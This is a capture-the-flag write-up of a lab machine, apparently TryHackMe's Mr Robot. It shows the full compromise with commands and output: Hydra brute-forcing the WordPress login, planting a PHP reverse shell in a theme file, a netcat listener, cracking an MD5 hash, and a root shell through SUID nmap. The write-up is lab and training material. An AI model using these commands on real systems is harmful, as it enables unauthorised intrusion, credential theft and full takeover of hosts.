# Mr Robot CTF
First do an nmap:
```sh
nmap -A -p- 10.10.13.150
```
This will give you the following open ports:
```
Nmap scan report for 10.10.13.150
Host is up (0.020s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
Device type: general purpose|specialized|storage-misc|broadband router|printer|WAP
Running (JUST GUESSING): Linux 5.X|3.X|4.X|2.6.X (95%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4 cpe:/o:linux:linux_kernel:2.6.22
Aggressive OS guesses: Linux 5.4 (95%), Linux 3.10 - 3.13 (90%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.5 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   20.34 ms 10.8.0.1
2   20.40 ms 10.10.13.150

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.65 seconds
```
There is a ssh port but it's closed, there's a webserver on 80 and 443.
The website contains a lot of cool stuff about the series but I wasn't able to find anything usefull.
So I desided to dirb the webserver,
```sh
dirb http://10.10.13.150
```
And this is what I got:
```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jan  3 13:09:01 2023
URL_BASE: http://10.10.13.150/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.13.150/ ----
==> DIRECTORY: http://10.10.13.150/0/                                                                                                                                                                                                                                                                                       
==> DIRECTORY: http://10.10.13.150/admin/                                                                                                                                                                                                                                                                                   
+ http://10.10.13.150/atom (CODE:301|SIZE:0)                                                                                                                                                                                                                                                                                
==> DIRECTORY: http://10.10.13.150/audio/                                                                                                                                                                                                                                                                                   
==> DIRECTORY: http://10.10.13.150/blog/                                                                                                                                                                                                                                                                                    
==> DIRECTORY: http://10.10.13.150/css/                                                                                                                                                                                                                                                                                     
+ http://10.10.13.150/dashboard (CODE:302|SIZE:0)                                                                                                                                                                                                                                                                           
+ http://10.10.13.150/favicon.ico (CODE:200|SIZE:0)                                                                                                                                                                                                                                                                         
==> DIRECTORY: http://10.10.13.150/feed/                                                                                                                                                                                                                                                                                    
==> DIRECTORY: http://10.10.13.150/image/                                                                                                                                                                                                                                                                                   
==> DIRECTORY: http://10.10.13.150/Image/                                                                                                                                                                                                                                                                                   
==> DIRECTORY: http://10.10.13.150/images/                                                                                                                                                                                                                                                                                  
+ http://10.10.13.150/index.html (CODE:200|SIZE:1188)                                                                                                                                                                                                                                                                       
+ http://10.10.13.150/index.php (CODE:301|SIZE:0)                                                                                                                                                                                                                                                                           
+ http://10.10.13.150/intro (CODE:200|SIZE:516314)                                                                                                                                                                                                                                                                          
==> DIRECTORY: http://10.10.13.150/js/                                                                                                                                                                                                                                                                                      
+ http://10.10.13.150/license (CODE:200|SIZE:309)                                                                                                                                                                                                                                                                           
+ http://10.10.13.150/login (CODE:302|SIZE:0)                                                                                                                                                                                                                                                                               
+ http://10.10.13.150/page1 (CODE:301|SIZE:0)                                                                                                                                                                                                                                                                               
+ http://10.10.13.150/phpmyadmin (CODE:403|SIZE:94)                                                                                                                                                                                                                                                                         
+ http://10.10.13.150/rdf (CODE:301|SIZE:0)                                                                                                                                                                                                                                                                                 
+ http://10.10.13.150/readme (CODE:200|SIZE:64)                                                                                                                                                                                                                                                                             
+ http://10.10.13.150/robots (CODE:200|SIZE:41)                                                                                                                                                                                                                                                                             
+ http://10.10.13.150/robots.txt (CODE:200|SIZE:41)                                                                                                                                                                                                                                                                         
+ http://10.10.13.150/rss (CODE:301|SIZE:0)                                                                                                                                                                                                                                                                                 
+ http://10.10.13.150/rss2 (CODE:301|SIZE:0)                                                                                                                                                                                                                                                                                
+ http://10.10.13.150/sitemap (CODE:200|SIZE:0)                                                                                                                                                                                                                                                                             
+ http://10.10.13.150/sitemap.xml (CODE:200|SIZE:0)                                                                                                                                                                                                                                                                         
==> DIRECTORY: http://10.10.13.150/video/                                                                                                                                                                                                                                                                                   
==> DIRECTORY: http://10.10.13.150/wp-admin/                                                                                                                                                                                                                                                                                
+ http://10.10.13.150/wp-config (CODE:200|SIZE:0)                                                                                                                                                                                                                                                                           
==> DIRECTORY: http://10.10.13.150/wp-content/                                                                                                                                                                                                                                                                              
+ http://10.10.13.150/wp-cron (CODE:200|SIZE:0)                                                                                                                                                                                                                                                                             
==> DIRECTORY: http://10.10.13.150/wp-includes/                                                                                                                                                                                                                                                                             
+ http://10.10.13.150/wp-links-opml (CODE:200|SIZE:227)                                                                                                                                                                                                                                                                     
+ http://10.10.13.150/wp-load (CODE:200|SIZE:0)                                                                                                                                                                                                                                                                             
+ http://10.10.13.150/wp-login (CODE:200|SIZE:2606)                                                                                                                                                                                                                                                                         
+ http://10.10.13.150/wp-mail (CODE:500|SIZE:3064)                                                                                                                                                                                                                                                                          
+ http://10.10.13.150/wp-settings (CODE:500|SIZE:0)                                                                                                                                                                                                                                                                         
+ http://10.10.13.150/wp-signup (CODE:302|SIZE:0)                                                                                                                                                                                                                                                                           
+ http://10.10.13.150/xmlrpc (CODE:405|SIZE:42)                                                                                                                                                                                                                                                                             
+ http://10.10.13.150/xmlrpc.php (CODE:405|SIZE:42)
```
http://10.10.13.150/wp-login tells me it a wordpress website but I found something way more interesting in http://10.10.13.150/robots:
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```
It's the first key and a dictionary! The dictionary contains what I assume to be possible username and/or password so I decided to use Hydra to try and get the username from wp-login using the following command:
```sh
Hydra -L fsocity.dic -p test 10.10.13.150 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.11.10.239%2Fwp-admin%2F&testcookie=1:Invalid username"
```
This toke quite some time but I managed to find the username so I did the same thing for the password slighty changed the command to, I'm hiding the actual usename to not spoil anything:
```sh
Hydra -l <username> -P fsocity.dic 10.10.13.150 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.11.10.239%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
```
After an other coffee break it found the password for me.
I logged in using the username and password and went to Appearance > Editor > author-bio.php:
![WP Backend](https://github.com/4a6f62/thm/blob/main/images/mrrobot/wp_theme_editor.png)
I downloaded a reverse php shell from https://github.com/pentestmonkey/php-reverse-shell and replaced the content of author-bio.php.
Don't forget to change $ip and $port in before saving!
Then I started listening for an incomming connection with netcat and used rlwrap for conviniance:
```sh
rlwrap nc -lnvp 1234
```
Then I navigated to 10.10.13.150/wp-content/themes/twentyfifteen/author-bio.php to initiate the shell.
```
Listening on 0.0.0.0 1234
Connection received on 10.10.13.150 46751
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 12:56:46 up  1:42,  0 users,  load average: 0.00, 0.19, 0.94
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
daemon
```
whoami tells me I'm daemon.
After finding the first key I'm assuming all the keys will be in textfiles starting with `key-*` so I used `find` to locate them.
```sh
find / -type f -name "key-*" -print 2>/dev/null
```
And I got this:
```
/usr/src/linux-headers-3.13.0-55/include/linux/key-type.h
/opt/bitnami/apps/wordpress/htdocs/key-1-of-3.txt
/home/robot/key-2-of-3.txt
/proc/key-users
```
We already found the first key but the second one is in `/home/robot/key-2-of-3.txt`
Using cat I got `Permission denied` but then I looked inside the home dir of `robot` and got this:
```
$ ls /home/robot/
key-2-of-3.txt
password.raw-md5
```
A md5 of the Robot's password?
Using cat, I don't know why this works but ok, I got:
```
robot:c3fcd3d76192e4007dfb496cca67e13b
```
Using john I was able to find the password easily:
```sh
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Now that we've got the password we can use `su` to become robot, only problem is `su` doesn't work via tty.
After some searching I found out we can make the shell `interactive` with python using this command from https://gtfobins.github.io:
```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```
Now we can use `su` to become `robot`:
```sh
daemon@linux:/$ su robot
su robot
Password:
```
And using `robot@linux:~$ cat ~/key-2-of-3.txt` we get the second key \o/
Looking for the other 3th key with find didn't get any results so I'm assuming it's in `/root`, so we need to be root.
`sudo -l` says robot is not allowed to use sudo so I used `find / -perm -u=s -type f 2>/dev/null` and got this:
```
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```
Nmap had the SUID bit set? Using `nmap --interactive` then `!sh` gave me root!
```
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
```
Using the find command again confirmed my assumtion:
```
# find / -type f -name "key-*" -print 2>/dev/null
find / -type f -name "key-*" -print 2>/dev/null
/usr/src/linux-headers-3.13.0-55/include/linux/key-type.h
/root/key-3-of-3.txt
/opt/bitnami/apps/wordpress/htdocs/key-1-of-3.txt
/home/robot/key-2-of-3.txt
/proc/key-users
```
Found key 3!
```sh
cat /root/key-3-of-3.txt
```
